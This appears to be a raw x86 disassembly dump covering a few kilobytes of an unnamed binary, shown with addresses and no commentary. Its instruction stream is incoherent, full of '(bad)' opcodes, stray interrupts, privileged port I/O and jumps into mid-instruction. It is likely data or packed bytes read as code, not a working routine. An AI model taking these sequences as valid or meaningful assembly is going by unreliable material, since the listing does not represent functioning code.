  423205:	in     al,dx
  423206:	test   BYTE PTR [esi+esi*4],al
  423209:	or     eax,0x5d760080
  42320e:	add    al,0xe6
  423210:	pop    ebp
  423211:	sub    al,0x82
  423213:	sub    eax,0xcdb576cd
  423218:	lea    esi,[ebp-0x3f772933]
  42321e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423224:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42322a:	push   ebx
  42322b:	ror    edi,cl
  42322d:	pop    ss
  42322e:	cmc    
  42322f:	inc    DWORD PTR [eax]
  423231:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423237:	jo     0x423206
  423239:	jbe    0x423234
  42323b:	int    0x8d
  42323d:	stc    
  42323e:	int    0xd6
  423240:	mov    BYTE PTR [ebx],bh
  423242:	lds    edi,FWORD PTR [ebx]
  423244:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42324b:	push   ebx
  42324c:	ror    edi,cl
  42324e:	pop    ss
  42324f:	xchg   ebp,eax
  423250:	inc    DWORD PTR [eax]
  423252:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423258:	jo     0x42325a
  42325a:	xchg   esi,eax
  42325b:	or     eax,0xcdf98dcd
  423260:	xchg   esi,eax
  423261:	stc    
  423262:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423265:	(bad)  
  423267:	jmp    0x4231fb
  423269:	shr    edx,cl
  42326b:	sub    BYTE PTR [ebx+0x13],dl
  42326e:	inc    ebx
  42326f:	jge    0x423247
  423271:	mov    ecx,ecx
  423273:	jbe    0x4232b2
  423275:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42327f:	cmp    eax,ebp
  423281:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423287:	repnz sub BYTE PTR [ebx-0x2d],dl
  42328b:	xchg   DWORD PTR [esi+0x6d],esi
  42328e:	or     dh,BYTE PTR [esi+0x6d]
  423291:	int    0x76
  423293:	cmp    eax,0x1cd46d06
  423298:	int    0x76
  42329a:	mov    ch,0xcd
  42329c:	lea    esi,[ebp-0xfc43ac5]
  4232a2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232a8:	push   ebx
  4232a9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232af:	xchg   ebp,eax
  4232b0:	int    0x76
  4232b2:	mov    ch,0xcd
  4232b4:	lea    esi,[ebp-0xfc43ac5]
  4232ba:	shl    edx,cl
  4232bc:	sub    bl,dl
  4232be:	mov    ebp,0xcdd35392
  4232c3:	lea    ebp,[ebp+0x76cd7d33]
  4232c9:	ins    DWORD PTR es:[edi],dx
  4232ca:	inc    ebx
  4232cb:	shr    DWORD PTR [edi],cl
  4232cd:	pop    es
  4232ce:	push   eax
  4232cf:	inc    DWORD PTR [eax]
  4232d1:	add    al,al
  4232d3:	jmp    FWORD PTR [eax-0x326a8933]
  4232d9:	lea    ebp,[ebp+0x43]
  4232dc:	jge    0x4232b4
  4232de:	xor    DWORD PTR [eax],eax
  4232e0:	(bad)  
  4232e1:	mov    bh,cl
  4232e3:	jbe    0x4232e2
  4232e5:	jo     0x4232a4
  4232e7:	stc    
  4232e8:	jl     0x42326a
  4232ea:	or     BYTE PTR [edx],0x76
  4232ed:	jne    0x4232db
  4232ef:	sbb    cl,ch
  4232f1:	jbe    0x423368
  4232f3:	int    0x8d
  4232f5:	mov    ch,0xcd
  4232f7:	xchg   esi,eax
  4232f8:	mov    ch,0x3b
  4232fa:	or     al,0x3b
  4232fc:	cdq    
  4232fd:	shr    ebx,cl
  4232ff:	xchg   edx,eax
  423300:	shr    edx,cl
  423302:	sub    BYTE PTR [ebx+0x13],dl
  423305:	push   ecx
  423306:	mov    ch,cl
  423308:	jbe    0x423303
  42330a:	int    0x8d
  42330c:	stc    
  42330d:	cmp    eax,ebp
  42330f:	cmp    ecx,DWORD PTR [edi]
  423311:	shl    edx,cl
  423313:	sub    bl,dl
  423315:	mov    ebp,0xcdd35392
  42331a:	lea    esi,[ebp+0x43]
  42331d:	shr    DWORD PTR [edi],cl
  42331f:	add    eax,0x80805300
  423324:	int    0x76
  423326:	stc    
  423327:	int    0x8d
  423329:	stc    
  42332a:	cmp    eax,ebp
  42332c:	cmp    ecx,DWORD PTR [edi]
  42332e:	shl    edx,cl
  423330:	sub    bl,dl
  423332:	mov    ebp,0xcdd35392
  423337:	(bad)  
  423338:	std    
  423339:	inc    ebx
  42333a:	shr    DWORD PTR [edi],cl
  42333c:	add    eax,0x808053ea
  423341:	int    0x76
  423343:	stc    
  423344:	int    0x8d
  423346:	stc    
  423347:	cmp    eax,ebp
  423349:	cmp    ecx,DWORD PTR [edi]
  42334b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423351:	push   ebx
  423352:	shr    esp,cl
  423354:	adc    al,0xcd
  423356:	lea    esi,[ebp+0x3bb596cd]
  42335c:	or     al,0x3b
  42335e:	cdq    
  42335f:	shr    ebx,cl
  423361:	xchg   edx,eax
  423362:	shr    edx,cl
  423364:	sub    BYTE PTR [ebx+0x13],dl
  423367:	xchg   ebx,edx
  423369:	int    0x8d
  42336b:	std    
  42336c:	inc    ebx
  42336d:	rol    DWORD PTR [edx-0x2893219],cl
  423373:	or     dh,BYTE PTR [esi-0x53]
  423376:	int    0x76
  423378:	jne    0x423384
  42337a:	jbe    0x42334c
  42337c:	ret    
  42337d:	dec    ecx
  42337e:	and    DWORD PTR [esi+0x45e60a35],eax
  423384:	leave  
  423385:	jbe    0x423324
  423387:	inc    ecx
  423388:	and    DWORD PTR [esi+0x4576cd35],eax
  42338e:	int    0x8d
  423390:	inc    ebp
  423391:	cmp    eax,ebp
  423393:	cmp    ecx,DWORD PTR [edi]
  423395:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42339b:	push   ebx
  42339c:	ror    DWORD PTR [edx],cl
  42339e:	jbe    0x4233f5
  4233a0:	int    0x76
  4233a2:	inc    ebp
  4233a3:	int    0x8d
  4233a5:	inc    ebp
  4233a6:	cmp    eax,ebp
  4233a8:	cmp    ecx,DWORD PTR [edi]
  4233aa:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233b0:	push   ebx
  4233b1:	ror    DWORD PTR [edx],cl
  4233b3:	jbe    0x42334a
  4233b5:	leave  
  4233b6:	jbe    0x4233f5
  4233b8:	dec    eax
  4233b9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233bf:	ret    0x8621
  4233c2:	xor    eax,0xcd4576cd
  4233c7:	lea    eax,[ebp+0x3b]
  4233ca:	lds    edi,FWORD PTR [ebx]
  4233cc:	psrlq  mm6,mm2
  4233cf:	sub    bl,dl
  4233d1:	mov    ebp,0xcdd35392
  4233d6:	lea    ebp,[ebp+0x52f7d43]
  4233dc:	push   ss
  4233dd:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233e3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233ea:	cmp    eax,0x3b5596cd
  4233ef:	jns    0x42342c
  4233f1:	or     al,0xd3
  4233f3:	lods   eax,DWORD PTR ds:[esi]
  4233f4:	sub    bl,dl
  4233f6:	jmp    0x42338a
  4233f8:	push   ebx
  4233f9:	jge    0x4233c8
  4233fb:	jbe    0x4233aa
  4233fd:	xor    edx,edx
  4233ff:	cmp    ebx,edx
  423401:	clc    
  423402:	add    cl,BYTE PTR [edx]
  423404:	jbe    0x42339b
  423406:	int    0x76
  423408:	sbb    eax,0x3b1d8dcd
  42340d:	lds    edi,FWORD PTR [ebx]
  42340f:	psrlq  mm6,mm2
  423412:	sub    bl,dl
  423414:	mov    ebp,0xcdd35392
  423419:	lea    edx,[ebp+0x16d87d43]
  42341f:	int    0x76
  423421:	sbb    eax,0x3b1d8dcd
  423426:	lds    edi,FWORD PTR [ebx]
  423428:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42342f:	push   ebx
  423430:	ror    DWORD PTR [edx],cl
  423432:	jbe    0x4233c9
  423434:	int    0x76
  423436:	cmp    eax,0x3b3d8dcd
  42343b:	lds    edi,FWORD PTR [ebx]
  42343d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423444:	push   ebx
  423445:	ror    ebp,cl
  423447:	lea    edx,[ebp+0xad3d12f]
  42344d:	jbe    0x4233e4
  42344f:	int    0x76
  423451:	inc    ebp
  423452:	int    0x8d
  423454:	inc    ebp
  423455:	cmp    eax,ebp
  423457:	cmp    ecx,DWORD PTR [edi]
  423459:	shl    edx,cl
  42345b:	sub    bl,dl
  42345d:	mov    ebp,0xcdd35392
  423462:	lea    edx,[ebp+0x52f7d43]
  423468:	pusha  
  423469:	xchg   edx,eax
  42346a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423471:	or     eax,0x875576cd
  423476:	jbe    0x423448
  423478:	or     ah,dh
  42347a:	xchg   ebp,eax
  42347b:	or     dh,BYTE PTR [esi+0x6d]
  42347e:	pop    ebp
  42347f:	inc    ecx
  423480:	and    DWORD PTR [esi+0x5d760a35],eax
  423486:	leave  
  423487:	jbe    0x42349e
  423489:	cmp    DWORD PTR [ecx],esp
  42348b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423491:	and    DWORD PTR [esi-0xe89f5cb],eax
  423497:	int    0x76
  423499:	xchg   ebp,eax
  42349a:	int    0x8d
  42349c:	xchg   ebp,eax
  42349d:	cmp    eax,ebp
  42349f:	cmp    ecx,DWORD PTR [edi]
  4234a1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234a7:	push   ebx
  4234a8:	ror    DWORD PTR [edx],cl
  4234aa:	jbe    0x423529
  4234ac:	int    0x6d
  4234ae:	jmp    0x4234b6
  4234b0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234ba:	add    BYTE PTR [ebx],cl
  4234bc:	and    DWORD PTR [esi-0x369232cb],eax
  4234c2:	push   es
  4234c3:	xchg   esp,eax
  4234c4:	add    BYTE PTR [eax],al
  4234c6:	add    bh,dh
  4234c8:	and    DWORD PTR [esi-0x329232cb],eax
  4234ce:	ins    DWORD PTR es:[edi],dx
  4234cf:	int    0x76
  4234d1:	icebp  
  4234d2:	int    0x8d
  4234d4:	icebp  
  4234d5:	cmp    eax,ebp
  4234d7:	cmp    ecx,DWORD PTR [edi]
  4234d9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234df:	push   ebx
  4234e0:	ror    ebp,cl
  4234e2:	lea    edi,[ebp+0x2f]
  4234e5:	rcl    ebx,1
  4234e7:	int    0x8d
  4234e9:	ins    DWORD PTR es:[edi],dx
  4234ea:	retf   0x8884
  4234ed:	or     DWORD PTR [esi-0x57],esi
  4234f0:	int    0x6d
  4234f2:	int    0x76
  4234f4:	icebp  
  4234f5:	int    0x8d
  4234f7:	icebp  
  4234f8:	cmp    ecx,DWORD PTR [edi]
  4234fa:	cmp    eax,ebp
  4234fc:	shl    edx,cl
  4234fe:	sub    bl,dl
  423500:	mov    ebp,0xcdd35392
  423505:	lea    edi,[ebp+0x2f]
  423508:	rcl    ebx,1
  42350a:	int    0x8d
  42350c:	adc    eax,0x3b1596cd
  423511:	or     al,0x3b
  423513:	cdq    
  423514:	shr    ebx,cl
  423516:	xchg   edx,eax
  423517:	shr    edx,cl
  423519:	sub    BYTE PTR [ebx+0x13],dl
  42351c:	xchg   ebx,edx
  42351e:	int    0x8d
  423520:	ins    DWORD PTR es:[edi],dx
  423521:	das    
  423522:	pop    ecx
  423523:	dec    esp
  423524:	mov    ch,cl
  423526:	push   es
  423527:	jo     0x423529
  423529:	add    BYTE PTR [eax],al
  42352b:	int    0x17
  42352d:	jo     0x42352f
  42352f:	add    BYTE PTR [eax],al
  423531:	cmp    eax,ebp
  423533:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423539:	jmp    0x2fd3:0x87d25328
  423540:	pop    ecx
  423541:	lea    ebp,[ecx-0x72f682c5]
  423547:	test   eax,0x76ca6dcd
  42354c:	test   eax,0xcdf18dcd
  423551:	xchg   esi,eax
  423552:	icebp  
  423553:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423556:	cdq    
  423557:	shr    edx,cl
  423559:	sub    bl,dl
  42355b:	jmp    0x4234ef
  42355d:	push   ebx
  42355e:	adc    ecx,ebp
  423560:	xchg   esi,eax
  423561:	jge    0x423592
  423563:	rcl    DWORD PTR [ebx],1
  423565:	int    0x96
  423567:	ins    DWORD PTR es:[edi],dx
  423568:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42356f:	icebp  
  423570:	int    0x8d
  423572:	icebp  
  423573:	cmp    eax,ebp
  423575:	cmp    ecx,DWORD PTR [edi]
  423577:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42357d:	push   ebx
  42357e:	ror    ebp,cl
  423580:	lea    edi,[ebp+0x2f]
  423583:	rcl    ebx,1
  423585:	int    0x8d
  423587:	ins    DWORD PTR es:[edi],dx
  423588:	retf   0x8884
  42358b:	or     DWORD PTR [esi-0x57],esi
  42358e:	int    0x6d
  423590:	int    0x76
  423592:	icebp  
  423593:	int    0x8d
  423595:	icebp  
  423596:	cmp    eax,ebp
  423598:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42359e:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235a2:	int    0x8d
  4235a4:	jge    0x4235d5
  4235a6:	rcl    ebx,1
  4235a8:	int    0x8d
  4235aa:	pop    ebp
  4235ab:	int    0x96
  4235ad:	pop    ebp
  4235ae:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235b1:	cdq    
  4235b2:	shr    ebx,cl
  4235b4:	xchg   edx,eax
  4235b5:	shr    edx,cl
  4235b7:	sub    BYTE PTR [ebx+0x13],dl
  4235ba:	xchg   ebx,edx
  4235bc:	int    0x8d
  4235be:	ins    DWORD PTR es:[edi],dx
  4235bf:	das    
  4235c0:	pop    ecx
  4235c1:	dec    esp
  4235c2:	mov    ch,cl
  4235c4:	push   es
  4235c5:	xchg   esp,eax
  4235c6:	add    BYTE PTR [eax],al
  4235c8:	add    ch,cl
  4235ca:	pop    ss
  4235cb:	xchg   esp,eax
  4235cc:	add    BYTE PTR [eax],al
  4235ce:	add    BYTE PTR [ebx],bh
  4235d0:	lds    edi,FWORD PTR [ebx]
  4235d2:	cdq    
  4235d3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235d9:	push   ebx
  4235da:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235e0:	test   eax,0x8d097d3b
  4235e5:	test   eax,0x76ca6dcd
  4235ea:	test   eax,0xcdf18dcd
  4235ef:	xchg   esi,eax
  4235f0:	icebp  
  4235f1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235f4:	cdq    
  4235f5:	shr    edx,cl
  4235f7:	sub    bl,dl
  4235f9:	jmp    0x42358d
  4235fb:	push   ebx
  4235fc:	adc    ecx,ebp
  4235fe:	xchg   esi,eax
  4235ff:	jge    0x423630
  423601:	rcl    DWORD PTR [ebx],1
  423603:	int    0x96
  423605:	ins    DWORD PTR es:[edi],dx
  423606:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42360d:	xor    eax,0x3b358dcd
  423612:	(bad)  
  423614:	(bad)
  423617:	sub    bl,dl
  423619:	mov    ebp,0xcdd35392
  42361e:	lea    ebx,[ebp-0x33]
  423621:	xchg   esi,eax
  423622:	pop    ebp
  423623:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423626:	cdq    
  423627:	shr    ebx,cl
  423629:	xchg   edx,eax
  42362a:	shr    edx,cl
  42362c:	sub    BYTE PTR [ebx+0x13],dl
  42362f:	das    
  423630:	rcl    ebx,1
  423632:	xchg   DWORD PTR [esi+0x7d],esi
  423635:	or     dh,BYTE PTR [esi+0x7d]
  423638:	int    0x76
  42363a:	jge    0x423609
  42363c:	lea    ecx,ds:0xb2f7d43
  423642:	(bad)  
  423643:	inc    DWORD PTR [eax]
  423645:	add    ch,cl
  423647:	jbe    0x4236a6
  423649:	int    0x8d
  42364b:	pop    ebp
  42364c:	cmp    ecx,DWORD PTR [edi]
  42364e:	shl    edx,cl
  423650:	sub    BYTE PTR [ebx],bh
  423652:	(bad)
  423655:	xchg   edx,eax
  423656:	push   ebx
  423657:	ror    ebp,cl
  423659:	lea    ecx,ds:0xcdd3d12f
  42365f:	lea    edx,[ebp-0x142cf3c5]
  423665:	xchg   edx,eax
  423666:	push   ebx
  423667:	ror    ebp,cl
  423669:	lea    edx,[ebp-0xd2cf0c5]
  42366f:	sub    BYTE PTR [ebx-0x2d],dl
  423672:	or     dh,BYTE PTR [esi+0x35]
  423675:	int    0x76
  423677:	popf   
  423678:	int    0x8d
  42367a:	popf   
  42367b:	cmp    ecx,DWORD PTR [edi]
  42367d:	shl    edx,cl
  42367f:	sub    BYTE PTR [ebx],bh
  423681:	(bad)
  423684:	xchg   edx,eax
  423685:	push   ebx
  423686:	ror    ebp,cl
  423688:	lea    ebx,[ebp+0x3b9d96cd]
  42368e:	or     al,0xd3
  423690:	jmp    0x423624
  423692:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423698:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42369e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236a4:	in     al,dx
  4236a5:	sbb    al,0xcd
  4236a7:	jbe    0x423646
  4236a9:	int    0x8d
  4236ab:	popf   
  4236ac:	cmp    eax,ebp
  4236ae:	cmp    ecx,DWORD PTR [edi]
  4236b0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236b6:	push   ebx
  4236b7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236bd:	push   ebp
  4236be:	int    0x76
  4236c0:	popf   
  4236c1:	int    0x8d
  4236c3:	popf   
  4236c4:	cmp    eax,ebp
  4236c6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236d0:	int    0x8d
  4236d2:	lods   eax,DWORD PTR ds:[esi]
  4236d3:	xor    edi,DWORD PTR [ebp-0x33]
  4236d6:	jbe    0x423675
  4236d8:	int    0x96
  4236da:	popf   
  4236db:	cmp    eax,ebp
  4236dd:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236e3:	mov    ebp,0xcdd25392
  4236e8:	xchg   esi,eax
  4236e9:	push   ebp
  4236ea:	das    
  4236eb:	rcl    edx,1
  4236ed:	inc    ebx
  4236ee:	shr    DWORD PTR [edi],cl
  4236f0:	pop    es
  4236f1:	adc    ebp,edi
  4236f3:	add    BYTE PTR [eax],al
  4236f5:	int    0x76
  4236f7:	stc    
  4236f8:	int    0x76
  4236fa:	stc    
  4236fb:	int    0x76
  4236fd:	std    
  4236fe:	or     dh,BYTE PTR [esi+0x35]
  423701:	int    0x76
  423703:	mov    ch,cl
  423705:	lea    esp,ds:0x3b2596cd
  42370b:	or     al,0xd3
  42370d:	jmp    0x4236a1
  42370f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423715:	add    BYTE PTR [eax+0x5328ead3],0x13
  42371c:	jno    0x4236eb
  42371e:	lea    esp,[ebp-0x33]
  423721:	xchg   esi,eax
  423722:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423726:	cdq    
  423727:	shr    ebx,cl
  423729:	xchg   edx,eax
  42372a:	shr    edx,cl
  42372c:	sub    BYTE PTR [ebx+0x13],dl
  42372f:	jno    0x4236fe
  423731:	(bad)  
  423732:	stc    
  423733:	int    0x96
  423735:	stc    
  423736:	add    dh,dl
  423738:	xor    eax,0x993b0c3b
  42373d:	shr    ebx,cl
  42373f:	xchg   edx,eax
  423740:	shr    edx,cl
  423742:	sub    BYTE PTR [ebx+0x13],dl
  423745:	jno    0x423747
  423747:	jo     0x42375d
  423749:	int    0x8d
  42374b:	stc    
  42374c:	int    0x96
  42374e:	stc    
  42374f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423752:	cdq    
  423753:	shr    ebx,cl
  423755:	xchg   edx,eax
  423756:	shr    edx,cl
  423758:	sub    BYTE PTR [ebx+0x13],dl
  42375b:	or     dh,BYTE PTR [esi+0x65]
  42375e:	inc    ebx
  42375f:	jge    0x423790
  423761:	add    eax,0x808080ab
  423766:	int    0x76
  423768:	stc    
  423769:	in     al,dx
  42376a:	(bad)  
  42376b:	int    0x96
  42376d:	or     dh,BYTE PTR gs:[esi-0x53]
  423771:	push   ecx
  423772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423773:	lods   eax,DWORD PTR ds:[esi]
  423774:	int    0x8d
  423776:	lods   eax,DWORD PTR ds:[esi]
  423777:	shr    ebx,cl
  423779:	xchg   edx,eax
  42377a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42377d:	lods   eax,DWORD PTR ds:[esi]
  42377e:	sub    BYTE PTR [ebx-0x2d],dl
  423781:	int    0x8d
  423783:	jne    0x42374f
  423785:	dec    esp
  423786:	or     DWORD PTR [ecx],0x8dcd304c
  42378c:	mov    ch,0xcd
  42378e:	lea    esi,[ebp+0x3bb596cd]
  423794:	or     al,0x3b
  423796:	cdq    
  423797:	shr    edx,cl
  423799:	sub    bl,dl
  42379b:	jmp    0x42372f
  42379d:	push   ebx
  42379e:	adc    ecx,ebp
  4237a0:	xchg   esi,eax
  4237a1:	mov    ch,0x87
  4237a3:	jge    0x423772
  4237a5:	jbe    0x423754
  4237a7:	cmp    edx,ebp
  4237a9:	add    al,0xad
  4237ab:	std    
  4237ac:	add    al,0xea
  4237ae:	std    
  4237af:	shr    ebx,cl
  4237b1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237b7:	leave  
  4237b8:	int    0x8d
  4237ba:	std    
  4237bb:	int    0x96
  4237bd:	std    
  4237be:	shr    edx,cl
  4237c0:	xchg   edx,eax
  4237c1:	shr    ebx,cl
  4237c3:	sub    BYTE PTR [ebx-0x1d],dl
  4237c6:	cmp    ebx,ecx
  4237c8:	inc    ebx
  4237c9:	rcl    dh,cl
  4237cb:	mov    ds:0xcd8876cd,eax
  4237d0:	lea    ebp,ds:0xcd2d96cd
  4237d6:	add    DWORD PTR [ecx],edx
  4237d8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237e2:	shr    edx,cl
  4237e4:	sub    BYTE PTR [ebx+0x13],dl
  4237e7:	jno    0x4237b6
  4237e9:	(bad)  
  4237ea:	stc    
  4237eb:	int    0x96
  4237ed:	stc    
  4237ee:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237f1:	cdq    
  4237f2:	shr    ebx,cl
  4237f4:	xchg   edx,eax
  4237f5:	shr    edx,cl
  4237f7:	sub    BYTE PTR [ebx+0x13],dl
  4237fa:	jno    0x4237fc
  4237fc:	(bad)  
  4237fd:	jne    0x4237ff
  4237ff:	jo     0x42381d
  423801:	int    0x76
  423803:	or     dh,BYTE PTR gs:[esi+0x75]
  423807:	int    0x76
  423809:	xor    eax,0xcdfd760a
  42380e:	jbe    0x42380d
  423810:	cmp    ecx,ebx
  423812:	add    al,0xbd
  423814:	test   ah,dl
  423816:	xor    ecx,ebp
  423818:	jbe    0x42388f
  42381a:	int    0x14
  42381c:	mov    ch,cl
  42381e:	jbe    0x423895
  423820:	int    0x84
  423822:	mov    BYTE PTR [ebx],bh
  423824:	jns    0x423861
  423826:	aad    0xd3
  423828:	lods   eax,DWORD PTR ds:[esi]
  423829:	sub    bl,dl
  42382b:	repz xchg edx,eax
  42382d:	push   ebx
  42382e:	ror    ch,cl
  423830:	xchg   esi,eax
  423831:	jne    0x42383d
  423833:	test   BYTE PTR [edx-0x33],cl
  423836:	jbe    0x423835
  423838:	add    al,0xd3
  42383a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423841:	xlat   BYTE PTR ds:[ebx]
  423842:	int    0x76
  423844:	std    
  423845:	cmp    ecx,ebx
  423847:	add    al,0xbd
  423849:	test   ah,dl
  42384b:	xor    ecx,ebp
  42384d:	jbe    0x4238c4
  42384f:	int    0x14
  423851:	mov    ch,cl
  423853:	jbe    0x4238ca
  423855:	int    0x84
  423857:	mov    BYTE PTR [ebx],bh
  423859:	jns    0x423896
  42385b:	aad    0xd3
  42385d:	lods   eax,DWORD PTR ds:[esi]
  42385e:	sub    bl,dl
  423860:	repz xchg edx,eax
  423862:	push   ebx
  423863:	ror    ch,cl
  423865:	xchg   esi,eax
  423866:	jne    0x423872
  423868:	test   BYTE PTR [edx-0x33],cl
  42386b:	jbe    0x42386a
  42386d:	add    al,0xd3
  42386f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423876:	xlat   BYTE PTR ds:[ebx]
  423877:	int    0x76
  423879:	jne    0x423885
  42387b:	jbe    0x42388a
  42387d:	int    0x76
  42387f:	mov    ch,0xcd
  423881:	lea    esi,[ebp+0xf3bc53b]
  423887:	shl    edx,cl
  423889:	sub    bl,dl
  42388b:	mov    ebp,0xcdd35392
  423890:	(bad)  
  423891:	stc    
  423892:	or     dh,BYTE PTR [esi+0x25]
  423895:	leave  
  423896:	jbe    0x423864
  423898:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42389f:	imul   edx,ebp,0x8d0a0c69
  4238a5:	gs adc bh,dl
  4238a8:	into   
  4238a9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238af:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238b6:	sar    DWORD PTR [ebx],cl
  4238b8:	lds    ecx,FWORD PTR [edx]
  4238ba:	jbe    0x423869
  4238bc:	rol    esi,cl
  4238be:	lods   eax,DWORD PTR ds:[esi]
  4238bf:	xchg   edx,eax
  4238c0:	or     dh,BYTE PTR [esi-0x30]
  4238c3:	int    0xd3
  4238c5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238c8:	lods   eax,DWORD PTR ds:[esi]
  4238c9:	sub    BYTE PTR [ebx+0x76],dl
  4238cc:	lods   eax,DWORD PTR ds:[esi]
  4238cd:	retf   0x858c
  4238d0:	int3   
  4238d1:	das    
  4238d2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238dd:	retf   
  4238de:	inc    ebx
  4238df:	rcl    esi,cl
  4238e1:	jle    0x4238b0
  4238e3:	jbe    0x42389a
  4238e5:	int    0x8d
  4238e7:	mov    ch,0xcd
  4238e9:	jbe    0x4238a0
  4238eb:	int    0x96
  4238ed:	mov    ch,0x3b
  4238ef:	jns    0x42392c
  4238f1:	or     al,0xd3
  4238f3:	lods   eax,DWORD PTR ds:[esi]
  4238f4:	sub    bl,dl
  4238f6:	jmp    0x42388a
  4238f8:	push   ebx
  4238f9:	jge    0x4238c8
  4238fb:	jbe    0x423962
  4238fd:	cmp    edi,DWORD PTR [ecx-0x2d]
  423900:	lods   eax,DWORD PTR ds:[esi]
  423901:	sub    BYTE PTR [ebx+0x76],dl
  423904:	lods   eax,DWORD PTR ds:[esi]
  423905:	cmp    edx,ebp
  423907:	xchg   DWORD PTR [ebp-0x33],edi
  42390a:	jbe    0x4238dc
  42390c:	add    al,0xea
  42390e:	std    
  42390f:	add    al,0xad
  423911:	std    
  423912:	shr    ebx,cl
  423914:	sub    BYTE PTR [edi+0x3b1353f1],al
  42391a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423921:	and    DWORD PTR [esi-0x323329cb],eax
  423927:	jbe    0x42394e
  423929:	in     al,dx
  42392a:	and    cl,ch
  42392c:	jbe    0x423927
  42392e:	int    0x8d
  423930:	stc    
  423931:	cmp    eax,ebp
  423933:	cmp    ecx,DWORD PTR [edi]
  423935:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42393b:	push   ebx
  42393c:	ror    ebp,cl
  42393e:	(bad)  
  42393f:	stc    
  423940:	int    0x96
  423942:	stc    
  423943:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423946:	cdq    
  423947:	shr    ebx,cl
  423949:	xchg   edx,eax
  42394a:	shr    edx,cl
  42394c:	sub    BYTE PTR [ebx+0x13],dl
  42394f:	inc    ebx
  423950:	jge    0x423981
  423952:	add    eax,0x80809223
  423957:	int    0x76
  423959:	or     eax,0xa886ccd
  42395e:	out    0xb5,al
  423960:	leave  
  423961:	jbe    0x423988
  423963:	mov    dl,0x21
  423965:	xchg   BYTE PTR ds:0x393576c9,dh
  42396b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423971:	dec    ecx
  423972:	mov    al,ds:0x76c93586
  423977:	lods   eax,DWORD PTR ds:[esi]
  423978:	imul   esp,DWORD PTR [ecx],0x76c93586
  42397e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423982:	xor    eax,0xcd3d760a
  423987:	jbe    0x423911
  423989:	int    0x8d
  42398b:	lods   eax,DWORD PTR ds:[esi]
  42398c:	int    0x96
  42398e:	lods   eax,DWORD PTR ds:[esi]
  42398f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423992:	jmp    0x423926
  423994:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42399a:	adc    esi,DWORD PTR [ecx-0x33]
  42399d:	lea    edx,[ebp+0x3b9596cd]
  4239a3:	or     al,0xd3
  4239a5:	jmp    0x423939
  4239a7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239ad:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239b4:	jno    0x423983
  4239b6:	lea    esp,[ebp-0x33]
  4239b9:	xchg   esi,eax
  4239ba:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239be:	cdq    
  4239bf:	shr    ebx,cl
  4239c1:	xchg   edx,eax
  4239c2:	shr    edx,cl
  4239c4:	sub    BYTE PTR [ebx+0x13],dl
  4239c7:	jno    0x423996
  4239c9:	lea    esi,[ebp+0x3bb596cd]
  4239cf:	or     al,0x3b
  4239d1:	cdq    
  4239d2:	shr    ebx,cl
  4239d4:	xchg   edx,eax
  4239d5:	shr    edx,cl
